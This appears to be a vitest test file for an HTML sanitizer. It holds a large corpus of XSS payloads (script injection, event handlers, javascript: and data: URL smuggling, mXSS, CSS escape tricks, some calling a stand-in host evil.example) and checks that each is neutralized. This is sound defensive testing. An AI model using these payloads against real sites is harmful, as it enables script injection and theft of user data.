import { describe, expect, test } from "vitest";
import * as browserEntry from "../src/index.browser.js";
import { sanitize } from "../src/index.js";

// A rich-text style policy: generous enough that payload wrappers survive,
// so evasion attempts are exercised instead of being trivially dropped.
const RICH_TEXT_RULES = [
  "html",
  "head",
  "body",
  ...Array(10).fill("p"),
  ...Array(10).fill("div"),
  ...Array(10).fill("span"),
  ...Array(10).fill("a"),
  ...Array(10).fill("li"),
  "a|href",
  "img",
  "img|src",
  "img|alt",
  "ul",
  "ol",
  "table",
  "tr",
  "td",
  "th",
  "b",
  "i",
  "em",
  "strong",
  "br",
  "blockquote",
  "pre",
  "code",
  "h1",
  "h2",
  "div|style",
  "span|style",
  "style",
  "style|div|color",
  "style|*|color",
  "style|div|background",
  "style|.note|margin"
];

const VECTORS: string[] = [
  // Script injection
  "<script>alert(1)</script>",
  "<script src=\"https://evil.example/x.js\"></script>",
  "\"><script>alert(1)</script>",
  "<scr<script>ipt>alert(1)</scr</script>ipt>",
  "<svg><script>alert(1)</script></svg>",
  "<svg><script href=\"data:text/javascript,alert(1)\"></script></svg>",
  // Event handlers
  "<img src=x onerror=alert(1)>",
  "<img src=x OnErRoR=alert(1)>",
  "<img src=x onerror\n=\nalert(1)>",
  "<svg onload=alert(1)>",
  "<body onload=alert(1)>",
  "<div onclick=\"alert(1)\">x</div>",
  "<details open ontoggle=alert(1)>x</details>",
  "<marquee onstart=alert(1)>x</marquee>",
  "<input onfocus=alert(1) autofocus>",
  "<select onfocus=alert(1) autofocus><option>x</option></select>",
  "<video onloadstart=alert(1)><source></video>",
  // URL scheme smuggling
  "<a href=\"javascript:alert(1)\">x</a>",
  "<a href=\"JaVaScRiPt:alert(1)\">x</a>",
  "<a href=\" &#14; javascript:alert(1)\">x</a>",
  "<a href=\"jav&#x09;ascript:alert(1)\">x</a>",
  "<a href=\"jav&#x0A;ascript:alert(1)\">x</a>",
  "<a href=\"java\u0000script:alert(1)\">x</a>",
  "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">x</a>",
  "<img src=\"javascript:alert(1)\">",
  "<img srcset=\"javascript:alert(1) 1x, https://example.com/ok.png 2x\">",
  "<table background=\"javascript:alert(1)\"><tr><td>x</td></tr></table>",
  "<form action=\"javascript:alert(1)\"><button>go</button></form>",
  "<isindex action=\"javascript:alert(1)\" type=\"image\">",
  // Frame/object/meta vectors
  "<iframe src=\"javascript:alert(1)\"></iframe>",
  "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
  "<object data=\"data:text/html,<script>alert(1)</script>\"></object>",
  "<embed src=\"javascript:alert(1)\">",
  "<base href=\"javascript:alert(1)//\">",
  "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
  "<link rel=\"stylesheet\" href=\"javascript:alert(1)\">",
  // CSS-based vectors
  "<div style=\"background:url(javascript:alert(1))\">x</div>",
  "<div style=\"background:url('https://evil.example/steal')\">x</div>",
  "<div style=\"color:expression(alert(1))\">x</div>",
  "<style>@import url(\"https://evil.example/x.css\");</style>",
  "<style>div{background:url(javascript:alert(1))}</style>",
  "<style>.note{margin:0;behavior:url(#default#time2)}</style>",
  // mXSS / namespace confusion
  "<math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>",
  "<svg><p><style><a href=\"</style><img src=x onerror=alert(1)>\"></a></style></p></svg>",
  "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\"></noscript>",
  "<template><script>alert(1)</script></template>",
  "<xmp><script>alert(1)</script></xmp>",
  "<svg><animate xlink:href=\"#x\" attributeName=\"href\" values=\"javascript:alert(1)\"></animate><a id=\"x\">x</a></svg>",
  "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x\"></use></svg>",
  // DOM clobbering attempts
  "<form id=\"attributes\"><input name=\"nodeName\"></form>",
  "<img name=\"body\"><img name=\"createElement\">"
];

const FORBIDDEN_ELEMENTS =
  "script,iframe,frame,frameset,object,embed,applet,base,meta,link,form,input,button,select,textarea,noscript,template,math,svg";

const URL_ATTRS = new Set([
  "href",
  "src",
  "xlink:href",
  "action",
  "formaction",
  "poster",
  "srcset",
  "data",
  "codebase",
  "archive",
  "cite",
  "longdesc",
  "usemap",
  "background",
  "profile",
  "icon",
  "manifest"
]);

function decodeNumericCharacterReferences(value: string): string {
  return value.replace(/&#(x?[0-9a-fA-F]+);?/g, (match, raw) => {
    const codePoint = raw.toLowerCase().startsWith("x") ? parseInt(raw.slice(1), 16) : parseInt(raw, 10);
    if (!Number.isFinite(codePoint) || codePoint < 0 || codePoint > 0x10ffff) {
      return match;
    }
    return String.fromCodePoint(codePoint);
  });
}

function isDangerousUrl(value: string): boolean {
  const decoded = decodeNumericCharacterReferences(value);
  const compact = decoded.replace(/[\u0000-\u001F\u007F\s]+/g, "").toLowerCase();
  return compact.startsWith("javascript:") || compact.startsWith("data:") || compact.startsWith("vbscript:");
}

function assertNoExecutableContent(output: string): void {
  const doc = new DOMParser().parseFromString(output, "text/html");
  expect(doc.querySelector(FORBIDDEN_ELEMENTS)).toBe(null);

  for (const element of Array.from(doc.querySelectorAll("*"))) {
    for (const attr of Array.from(element.attributes)) {
      const name = attr.name.toLowerCase();
      expect(name.startsWith("on"), `event handler ${name} survived`).toBe(false);

      if (name === "style") {
        const css = attr.value.toLowerCase();
        expect(css.includes("url(")).toBe(false);
        expect(css.includes("expression(")).toBe(false);
        expect(css.includes("behavior")).toBe(false);
      }

      if (!URL_ATTRS.has(name)) continue;
      if (name === "srcset") {
        for (const entry of attr.value.split(",")) {
          const urlPart = entry.trim().split(/\s+/)[0];
          if (urlPart) expect(isDangerousUrl(urlPart), `dangerous srcset entry: ${urlPart}`).toBe(false);
        }
      } else {
        expect(isDangerousUrl(attr.value), `dangerous ${name}: ${attr.value}`).toBe(false);
      }
    }
  }

  for (const style of Array.from(doc.querySelectorAll("style"))) {
    const css = (style.textContent ?? "").toLowerCase();
    expect(css.includes("url(")).toBe(false);
    expect(css.includes("@import")).toBe(false);
    expect(css.includes("expression(")).toBe(false);
    expect(css.includes("behavior")).toBe(false);
  }
}

describe("XSS vector corpus", () => {
  for (const vector of VECTORS) {
    test(`neutralizes: ${vector.slice(0, 72)}`, () => {
      const output = sanitize(vector, RICH_TEXT_RULES, {
        allowCommonAttributes: true,
        dangerouslyAllowJavaScript: false
      });
      assertNoExecutableContent(output);
      expect(sanitize(output, RICH_TEXT_RULES, { allowCommonAttributes: true, dangerouslyAllowJavaScript: false })).toBe(
        output
      );
      expect(
        browserEntry.sanitize(vector, RICH_TEXT_RULES, { allowCommonAttributes: true, dangerouslyAllowJavaScript: false })
      ).toBe(output);
    });
  }

  test("payloads embedded in otherwise-legitimate documents are neutralized", () => {
    const wrapped =
      "<div><h1>Title</h1><p>Intro <b>text</b></p>" +
      VECTORS.join("") +
      "<ul><li>one</li><li><a href=\"https://example.com\">two</a></li></ul></div>";
    const output = sanitize(wrapped, RICH_TEXT_RULES, { allowCommonAttributes: true, dangerouslyAllowJavaScript: false });
    assertNoExecutableContent(output);
  });
});

describe("allowDataImageUrls vector corpus", () => {
  const RULES_WITH_SRCSET = [...RICH_TEXT_RULES, "img|srcset"];
  const CONFIG = { allowCommonAttributes: true, dangerouslyAllowJavaScript: false, allowDataImageUrls: true };

  const DANGEROUS_DATA_IMAGE_VECTORS: string[] = [
    "<img src=\"data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+\">",
    "<img src=\"data:image/svg+xml,<svg onload=alert(1)></svg>\">",
    "<img src=\"data:IMAGE/SVG+XML,<svg onload=alert(1)></svg>\">",
    "<img src=\"data:image/svg+xml;charset=utf-8;base64,AAAA=\">",
    "<img src=\"data:text/html,<script>alert(1)</script>\">",
    "<img src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
    "<img src=\"data:application/javascript,alert(1)\">",
    "<img src=\"data:image/png;base64\">",
    "<img src=\"data:image/png\">",
    "<img srcset=\"data:image/svg+xml,<svg onload=alert(1)></svg> 1x\">",
    "<img srcset=\"data:image/png;base64,AAAA= 1x, data:image/svg+xml,<svg onload=alert(1)></svg> 2x\">",
    "<img srcset=\"data:image/png;base64,AAAA= 1x, javascript:alert(1) 2x\">",
    "<a href=\"data:image/png;base64,AAAA=\">x</a>"
  ];

  for (const vector of DANGEROUS_DATA_IMAGE_VECTORS) {
    test(`neutralizes with allowDataImageUrls enabled: ${vector.slice(0, 72)}`, () => {
      const output = sanitize(vector, RULES_WITH_SRCSET, CONFIG);
      assertNoExecutableContent(output);
      expect(output.toLowerCase()).not.toContain("svg+xml");
      expect(output.toLowerCase()).not.toContain("text/html");
      expect(output.toLowerCase()).not.toContain("javascript:");
      expect(sanitize(output, RULES_WITH_SRCSET, CONFIG)).toBe(output);
      expect(browserEntry.sanitize(vector, RULES_WITH_SRCSET, CONFIG)).toBe(output);
    });
  }

  test("still allows safe raster data:image URLs through on img|src and img|srcset", () => {
    const input =
      "<img src=\"data:image/png;base64,iVBORw0KGgo=\" " +
      "srcset=\"data:image/jpeg;base64,AAAA= 1x, https://example.com/b.png 2x\">";
    const output = sanitize(input, RULES_WITH_SRCSET, CONFIG);
    const img = new DOMParser().parseFromString(output, "text/html").querySelector("img");
    expect(img?.getAttribute("src")).toBe("data:image/png;base64,iVBORw0KGgo=");
    expect(img?.getAttribute("srcset")).toBe("data:image/jpeg;base64,AAAA= 1x, https://example.com/b.png 2x");
  });
});

// A <template>'s parsed children live in an inert `.content` DocumentFragment,
// not among its childNodes, so a naive document walk skips them entirely. The
// filtering pass must descend into template content: everything inside is
// latent markup that a client script can clone into the live DOM, at which
// point any surviving handler/URL/style fires. These guard against a
// regression where template content bypasses the allowlist and leans solely on
// DOMPurify (unsound, because allowDataImageUrls widens DOMPurify's URI filter
// to trust a pre-filter that never ran inside the template).
describe("template content is filtered, not just DOMPurify-trusted", () => {
  const RULES = [
    "template",
    "template",
    "img",
    "img|src",
    "img|srcset",
    "a",
    "a|href",
    "b",
    "b|style",
    "style|b|color",
    "style",
    "style|p|color"
  ];
  const CONFIG = { allowCommonAttributes: true, dangerouslyAllowJavaScript: false, allowDataImageUrls: true };

  // Assert on the fully-instantiated tree, descending through template content
  // the way a browser would when the fragment is cloned into the document.
  function assertTemplateContentClean(output: string): void {
    const doc = new DOMParser().parseFromString(output, "text/html");
    const walk = (root: ParentNode): void => {
      for (const element of Array.from(root.querySelectorAll("*"))) {
        for (const attr of Array.from(element.attributes)) {
          expect(attr.name.toLowerCase().startsWith("on"), `handler ${attr.name} survived`).toBe(false);
        }
        const content = (element as Partial<HTMLTemplateElement>).content;
        if (content) walk(content);
      }
    };
    walk(doc);
    const lower = output.toLowerCase();
    expect(lower).not.toContain("svg+xml");
    expect(lower).not.toContain("javascript:");
    expect(lower).not.toContain("onload");
    expect(lower).not.toContain("onerror");
    expect(lower).not.toContain("@import");
  }

  const TEMPLATE_VECTORS: string[] = [
    "<template><img src=\"data:image/svg+xml,<svg onload=alert(1)></svg>\"></template>",
    "<template><img srcset=\"data:image/svg+xml,<svg onload=alert(1)></svg> 1x\"></template>",
    "<template><a href=\"javascript:alert(1)\">x</a></template>",
    "<template><b style=\"color:red;position:fixed\" onclick=\"alert(1)\">x</b></template>",
    "<template><style>@import url(https://evil.example/x.css); p{color:red;background:url(https://evil.example/t.png)}</style></template>",
    "<template><template><img src=\"data:image/svg+xml,<svg onload=alert(1)></svg>\"></template></template>",
    "<template><img src=x onerror=alert(1)></template>"
  ];

  for (const vector of TEMPLATE_VECTORS) {
    test(`neutralizes inside template: ${vector.slice(0, 64)}`, () => {
      const output = sanitize(vector, RULES, CONFIG);
      assertTemplateContentClean(output);
      expect(sanitize(output, RULES, CONFIG)).toBe(output);
      expect(browserEntry.sanitize(vector, RULES, CONFIG)).toBe(output);
    });
  }

  test("safe raster data:image URLs still pass through template content", () => {
    const output = sanitize(
      "<template><img src=\"data:image/png;base64,iVBORw0KGgo=\"></template>",
      RULES,
      CONFIG
    );
    expect(output).toContain("data:image/png;base64,iVBORw0KGgo=");
  });

  test("tag-count budget spans template content", () => {
    // one <b> allowed across the whole document; two are inside the template
    const output = sanitize("<template><b>1</b><b>2</b></template><b>3</b>", ["template", "b"], {});
    expect((output.match(/<b>/g) ?? []).length).toBe(1);
  });
});

describe("CSS escape sequences cannot smuggle dangerous functions", () => {
  // In CSS, `\75` is the hex escape for `u`, `\72` for `r`, `\65` for `e`, so a
  // browser reads `\75rl(...)`, `u\72l(...)`, and `\75 rl(...)` (the trailing
  // space terminates the hex escape) all as `url(...)`, and `\65xpression(...)`
  // as `expression(...)`. postcss-value-parser keeps the backslashes verbatim,
  // so the dangerous-function check must decode escapes first or these slip
  // through. Each pair is [description, dangerous style value].
  const inlineVectors: [string, string][] = [
    ["fully escaped url", "background:\\75rl(https://evil.example/x)"],
    ["partly escaped url", "background:u\\72l(https://evil.example/x)"],
    ["hex escape with terminating space", "background:\\75 rl(https://evil.example/x)"],
    ["escaped legacy expression", "width:\\65xpression(alert(1))"],
    ["escaped parens around url arg", "background:url\\28https://evil.example/x\\29"]
  ];

  const STYLE_RULES = ["p", "p|style", "style|*|background", "style|*|width"];

  for (const [name, value] of inlineVectors) {
    test(`inline style: ${name}`, () => {
      const output = sanitize(`<p style="${value}">hi</p>`, STYLE_RULES);
      expect(output).not.toMatch(/url|expression/i);
      // idempotent + entry parity
      expect(sanitize(output, STYLE_RULES)).toBe(output);
      expect(browserEntry.sanitize(`<p style="${value}">hi</p>`, STYLE_RULES)).toBe(output);
    });
  }

  test("style element: escaped url is stripped", () => {
    const output = sanitize(
      "<style>p{background:\\75rl(https://evil.example/x)}</style><p>hi</p>",
      ["style", "p", "style|p|background"]
    );
    expect(output).not.toMatch(/url|evil/i);
  });

  test("legitimate escaped content is still allowed", () => {
    // `\27` is an escaped apostrophe; nothing dangerous, must survive.
    const value = "background:red";
    const output = sanitize(`<p style="${value}">hi</p>`, STYLE_RULES);
    expect(output).toContain("background:red");
  });
});
